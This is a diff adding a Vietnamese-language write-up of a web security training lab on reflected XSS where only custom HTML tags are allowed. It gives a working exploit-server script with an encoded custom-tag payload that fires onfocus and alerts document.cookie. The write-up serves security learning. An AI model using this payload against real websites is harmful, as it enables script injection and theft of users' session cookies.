@@ -189,7 +189,29 @@ Deliver to victim => Lab Solved!
 
 ***
 
-## 6. 
+## 6. Lab: Reflected XSS into HTML context with all tags blocked except custom ones
 
+* Content:
+```
+This lab blocks all HTML tags except custom ones.
 
+To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.
+```
+* Exploit:
+
+Làm như lab cũ, xác định thẻ `custom tags` không bị chặn
+
+<img width="423" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/71de5b97-021e-4666-9bae-0a3dd43b338d">
+
+Paste đoạn code sau lên Exploit Server
+
+```javascript
+<script>
+location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+```
+
+Deliver to victim => Lab solved!
+
+<img width="583" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/a26a8b16-44d2-4218-8149-4e0310d1316c">
 
